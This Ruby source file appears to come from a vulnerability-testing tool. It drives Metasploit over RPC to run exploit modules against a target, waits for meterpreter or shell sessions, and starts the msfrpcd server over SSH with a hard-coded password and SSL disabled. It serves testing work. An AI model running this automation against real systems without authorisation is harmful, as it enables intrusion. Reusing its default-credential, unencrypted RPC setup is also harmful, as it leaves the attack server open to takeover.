# Copyright [2019] [University of Aizu]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

require 'bundler/setup'
require 'net/ssh'
require 'tty-prompt'

require './lib/attack/method/haijack'
require './lib/attack/tools/metasploit'
require './lib/ui'

class Attack
  attr_reader :msf_api, :error_module

  include Haijack

  def initialize
    @msf_api = nil
    @error_module = {}
    @execute_job_list = []
  end

  def connect_metasploit(attack_host)
    @msf_api = Metasploit.new(attack_host)
    @msf_api.auth_login
    @msf_api.console_create
  end

  def execute?(args)
    msf_modules = args[:msf_modules]

    VultestUI.execute('Exploit attack')
    msf_modules.each do |msf_module|
      msf_module_option = configure_module_option(attack_host: args[:attack_host], msf_module: msf_module)
      msf_module_info = @msf_api.module_execute(type: msf_module['module_type'], name: msf_module['module_name'], option: msf_module_option)

      connection = connection?(msf_module['module_name'], msf_module_info)
      @execute_job_list << msf_module_info['job_id']

      next if connection

      @error_module[:name] = msf_module['module_name']
      @error_module[:option] = msf_module_option
      @execute_job_list.each { |id| @msf_api.job_stop(id) }
      return false
    end

    true
  end

  def verify
    VultestUI.execute('Execute verify')
    VultestUI.execute('Brake into target machine')

    session_type = nil
    session_id = nil
    @msf_api.module_session_list.each do |key, value|
      session_id = key if value['type'] == 'meterpreter' || value['type'] == 'shell'
      session_type = value['type'] unless session_id.nil?
    end
    return if session_id.nil?

    if session_type == 'meterpreter'
      meterpreter(api: @msf_api, id: session_id)
    elsif session_type == 'shell'
      shell(api: @msf_api, id: session_id)
    end
  end

  def prepare(args = {})
    begin
      VultestUI.tty_spinner_begin('Metasploit server')
      startup_metasploit_server(host: args[:host], user: args[:user], passwd: args[:passwd])
    rescue StandardError
      VultestUI.tty_spinner_end('error')
      VultestUI.warring('Run your attack machine now')

      p = TTY::Prompt.new
      p.keypress(' If it is running now, puress ENTER key', keys: [:return])
      retry
    end
    VultestUI.tty_spinner_end('success')
  end

  private

  def configure_module_option(args)
    msf_module_option = {}
    args[:msf_module]['options'].each { |option| msf_module_option[option['name']] = option['var'] }
    msf_module_option['LHOST'] = args[:attack_host]
    msf_module_option
  end

  def connection?(module_name, module_info)
    VultestUI.tty_spinner_begin(module_name)
    continue_flag = true
    success_flag = false
    time_count = 0

    while continue_flag
      sleep(1)
      time_count += 1
      unless @msf_api.module_session_list.empty?
        @msf_api.module_session_list.each do |_key, value|
          success_flag = true if module_info['uuid'] == value['exploit_uuid']
        end
      end
      break if success_flag

      next unless (time_count % 10).zero? && time_count >= 10

      VultestUI.tty_spinner_end('error')
      continue_flag = TTY::Prompt.new.yes?('There\'s a possibility that attack is fail. Are you still going to continue that?')
      VultestUI.tty_spinner_begin(module_name)
    end

    success_flag ? VultestUI.tty_spinner_end('success') : VultestUI.tty_spinner_end('error')
    success_flag
  end

  def startup_metasploit_server(args = {})
    Net::SSH.start(args[:host], args[:user], password: args[:passwd]) do |ssh|
      ssh.exec!("msfrpcd -a #{args[:host]} -p 55553 -U msf -P metasploit -S false \>/dev/null 2>&1")
      ssh.exec!("msfrpcd -a #{args[:host]} -p 55553 -U msf -P metasploit -S false")
    end
  end
end
